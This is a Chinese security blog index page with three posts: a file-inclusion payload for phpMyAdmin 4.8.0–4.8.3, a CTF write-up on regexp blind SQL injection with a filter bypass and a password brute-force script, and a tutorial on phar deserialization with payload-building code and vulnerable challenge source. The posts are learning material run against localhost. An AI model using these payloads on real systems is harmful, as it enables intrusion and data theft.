<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/boogle.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/boogle.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Boogle&#39;s Blogs">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Boogle&#39;s Blogs">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Boogle&#39;s Blogs">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/">





  <title>Boogle's Blogs</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Boogle's Blogs</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/25/phpmyadmin4-8-0-4-8-3任意文件包含/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/25/phpmyadmin4-8-0-4-8-3任意文件包含/" itemprop="url">phpmyadmin4.8.0~4.8.3任意文件包含payload</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-25T14:01:50+08:00">
                2018-12-25
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpmyadmin-4.8.1/index.php?target=db_sql.php%253f/../../../../../../phpStudy/PHPTutorial/MySQL/data/foo/bar.frm</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2018/12/25/5c2234d0d19bb.png" alt></p>
<p><img src="https://i.loli.net/2018/12/25/5c2234fe3278c.png" alt></p>
<p>参考链接：<a href="https://mp.weixin.qq.com/s?spm=a2c4e.11153940.blogcont603201.15.70cd4f55qyXv64&amp;__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV%2bLmMK#rd" target="_blank" rel="noopener">【首发】phpmyadmin4.8.1后台getshell</a></p>
<p>  还可以包含session文件：<a href="https://yq.aliyun.com/articles/603201" target="_blank" rel="noopener">https://yq.aliyun.com/articles/603201</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/regexp盲注/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/26/regexp盲注/" itemprop="url">regexp盲注</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-26T15:14:21+08:00">
                2018-11-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>红日安全团队的发出的一道题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &quot;./config.php&quot;;</span><br><span class="line">include &quot;./flag.php&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$black_list = &quot;/admin|guest|limit|by|substr|mid|like|or|char|union|select|greatest|%00|\&apos;|&quot;;</span><br><span class="line">$black_list .= &quot;=|_| |in|&lt;|&gt;|-|chal|_|\.|\(\)|#|and|if|database|where|concat|insert|having|sleep/i&quot;;</span><br><span class="line">if(preg_match($black_list, $_GET[&apos;user&apos;])) exit(&quot;:P&quot;); </span><br><span class="line">if(preg_match($black_list, $_GET[&apos;pwd&apos;])) exit(&quot;:P&quot;); </span><br><span class="line"></span><br><span class="line">$query=&quot;select user from users where user=&apos;$_GET[user]&apos; and pwd=&apos;$_GET[pwd]&apos;&quot;;</span><br><span class="line">echo &quot;&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;&quot;;</span><br><span class="line">$result = $conn-&gt;query($query);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    if($row[&apos;user&apos;]) echo &quot;&lt;h2&gt;Welcome &#123;$row[&apos;user&apos;]&#125;&lt;/h2&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $conn-&gt;query(&quot;select pwd from users where user=&apos;admin&apos;&quot;);</span><br><span class="line">if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $admin_pass = $row[&apos;pwd&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(($admin_pass)&amp;&amp;($admin_pass === $_GET[&apos;pwd&apos;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>审计代码可以看到在登陆处存在注入，但是前面black_list对get的user、pwd都进行了过滤。那我们就要想办法对waf进行让绕过，首先对单引号的过滤导致无法常规闭合原来的查询语句，那么这里可以使用<strong>\</strong>转义原有语句的单引号,使其与后面的单引号闭合，然后注释掉最后的单引号即可。但是这里对注释符<strong>#  -</strong>进行了过滤，可以使用<strong>;%00</strong>绕过。再就是对一些sql语句进行了过滤，但是并没有过滤 REGEXP 正则操作符。</p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/1.php?user=\&amp;pwd=||pwd/**/regexp/**/&quot;^c&quot;;%00</span><br></pre></td></tr></table></figure></p>
<p>python脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str1 = &apos;0123456789abcdefghijklmnopqrstuvwxyz_&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://127.0.0.1/1.php?user=\&amp;pwd=||pwd/**/regexp/**/&quot;^&#123;0&#125;&quot;;%00&apos;</span><br><span class="line"></span><br><span class="line">md5 = &apos;&apos;</span><br><span class="line">while 1:</span><br><span class="line">	for i in str1:</span><br><span class="line">		</span><br><span class="line">		x = md5+i</span><br><span class="line">		u = url.format(x)</span><br><span class="line">		#print u</span><br><span class="line">		res = requests.get(u)</span><br><span class="line">		if &apos;Welcome Admin&apos; in res.text:</span><br><span class="line">			md5 = md5+i</span><br><span class="line">			print md5</span><br><span class="line">			break</span><br><span class="line">	if i ==&apos;_&apos;:</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/24/phar-实现php反序列化/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="boogle">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Boogle's Blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/11/24/phar-实现php反序列化/" itemprop="url">phar 实现php反序列化</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-24T14:04:19+08:00">
                2018-11-24
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web安全/" itemprop="url" rel="index">
                    <span itemprop="name">web安全</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>在Blackhat2018，安全研究员Sam Thomas分享了议题<strong>It’s a PHP unserialization vulnerability Jim, but not as we know it</strong>,利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。</p>
<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>漏洞触发点在使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化。当内核调用phar_parse_metadata()解析metadata数据时，会调用php_var_unserialize()对其进行反序列化操作，因此会造成反序列化漏洞。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</li>
</ul>
<p>下面的函数可以利用<br><img src="https://i.loli.net/2018/11/24/5bf8bf760dcb3.png" alt></p>
<h3 id="测试demo"><a href="#测试demo" class="headerlink" title="测试demo"></a>测试demo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//index.php</span><br><span class="line">&lt;?php</span><br><span class="line">class foo</span><br><span class="line">&#123;</span><br><span class="line">    var $ha = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;ha);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$ka = $_GET[&apos;file&apos;];</span><br><span class="line">file_exists($ka);</span><br></pre></td></tr></table></figure>
<p>可以看到foo是一个危险函数，当危险的对象被反序列化时eval会导致命令执行。这里正好有一个file_exists的文件操作函数，为了测试方便，我们直接生成phar文件放在index.php所在目录。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//构造phar文件的代码</span><br><span class="line">&lt;?php</span><br><span class="line">//把要进行反序列化的对象放在此处</span><br><span class="line">class foo</span><br><span class="line">&#123;</span><br><span class="line">    var $ha = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;ha);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    //生成对应可被利用的对象</span><br><span class="line">    $o = new foo();</span><br><span class="line">　　 $o-&gt;ha=&apos;echo &quot;hello boogle&quot;;&apos;;</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头用以欺骗检测</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里因为调用了phar的setMetadata方法，所以需要设置php.ini中<strong>phar.readonly = Off </strong><br>而使用phar文件只需要(PHP 5 &gt;= 5.3.0, PHP 7, PECL phar &gt;= 1.0.0)即可。<br>这里生成的phar.phar可以修改为任意文件后缀，比如1.gif。<br>然后访问index.php，使用<strong>phar://</strong>读取<br><img src="https://i.loli.net/2018/11/24/5bf8c47b68e73.png" alt></p>
<h2 id="0x03-CTF题"><a href="#0x03-CTF题" class="headerlink" title="0x03 CTF题"></a>0x03 CTF题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                   </span><br><span class="line">$SANDBOX = &quot;../data/&quot; . md5($SECRET. $_SERVER[&quot;REMOTE_ADDR&quot;]); </span><br><span class="line">$FILEBOX = &quot;../file/&quot; . md5(&quot;K0rz3n&quot;. $_SERVER[&quot;REMOTE_ADDR&quot;]);    </span><br><span class="line">@mkdir($SANDBOX); </span><br><span class="line">@mkdir($FILEBOX); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; </span><br><span class="line">    $data = serialize(new User($SANDBOX)); </span><br><span class="line">    $hmac = hash_hmac(&quot;md5&quot;, $data, $SECRET); </span><br><span class="line">    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));       </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar = $path;                                           </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class K0rz3n_secret_flag &#123; </span><br><span class="line">    protected $file_path; </span><br><span class="line">    function __destruct()&#123; </span><br><span class="line">        if(preg_match(&apos;/(log|etc|session|proc|read_secret|history|class)/i&apos;, $this-&gt;file_path))&#123; </span><br><span class="line">            die(&quot;Sorry Sorry Sorry&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    include_once($this-&gt;file_path); </span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check_session() &#123; </span><br><span class="line">    global $SECRET; </span><br><span class="line">    $data = $_COOKIE[&quot;session-data&quot;]; </span><br><span class="line">    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); </span><br><span class="line">    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123; </span><br><span class="line">        die(&quot;Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    if ( !hash_equals(hash_hmac(&quot;md5&quot;, $data, $SECRET), $hmac) )&#123; </span><br><span class="line">        die(&quot;Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $data = unserialize($data); </span><br><span class="line"></span><br><span class="line">    if ( !isset($data-&gt;avatar) )&#123; </span><br><span class="line">        die(&quot;Bye Bye Bye&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    return $data-&gt;avatar;                                                </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($path) &#123; </span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123; </span><br><span class="line">         if(preg_match(&apos;/^(http|https).*/i&apos;, $_GET[&apos;url&apos;]))&#123; </span><br><span class="line">            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                     </span><br><span class="line">            if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123; </span><br><span class="line">                die(&quot;Fuck off&quot;); </span><br><span class="line">            &#125; </span><br><span class="line">            file_put_contents($path . &quot;/avatar.gif&quot;, $data); </span><br><span class="line">            die(&quot;Upload OK&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Hacker&quot;); </span><br><span class="line">        &#125;            </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        die(&quot;Miss the URL~~&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function show($path) &#123; </span><br><span class="line">    if ( !is_dir($path) || !file_exists($path . &quot;/avatar.gif&quot;)) &#123; </span><br><span class="line"></span><br><span class="line">        $path = &quot;/var/www&quot;; </span><br><span class="line">    &#125; </span><br><span class="line">    header(&quot;Content-Type: image/gif&quot;); </span><br><span class="line">    die(file_get_contents($path . &quot;/avatar.gif&quot;));                      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function check($path)&#123; </span><br><span class="line">    if(isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">        if(preg_match(&apos;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i&apos;,$_GET[&apos;c&apos;]))&#123; </span><br><span class="line">            die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            $file_path = $_GET[&apos;c&apos;]; </span><br><span class="line">            list($width, $height, $type) = @getimagesize($file_path); </span><br><span class="line">            die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">                &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;); </span><br><span class="line">        die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; . </span><br><span class="line">            &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function move($source_path,$dest_name)&#123; </span><br><span class="line">    global $FILEBOX; </span><br><span class="line">    $dest_path = $FILEBOX . &quot;/&quot; . $dest_name; </span><br><span class="line">    if(preg_match(&apos;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&apos;,$source_path))&#123; </span><br><span class="line">        die(&quot;Hacker Hacker Hacker&quot;); </span><br><span class="line">    &#125;else&#123; </span><br><span class="line">        if(copy($source_path,$dest_path))&#123; </span><br><span class="line">            die(&quot;Successful copy&quot;); </span><br><span class="line">        &#125;else&#123; </span><br><span class="line">            die(&quot;Copy failed&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[&quot;m&quot;]; </span><br><span class="line"></span><br><span class="line">if ($mode == &quot;upload&quot;)&#123; </span><br><span class="line">     upload(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;show&quot;)&#123; </span><br><span class="line">    show(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if ($mode == &quot;check&quot;)&#123; </span><br><span class="line">    check(check_session()); </span><br><span class="line">&#125; </span><br><span class="line">else if($mode == &quot;move&quot;)&#123; </span><br><span class="line">    move($_GET[&apos;source&apos;],$_GET[&apos;dest&apos;]); </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">include(&quot;./comments.html&quot;);</span><br></pre></td></tr></table></figure>
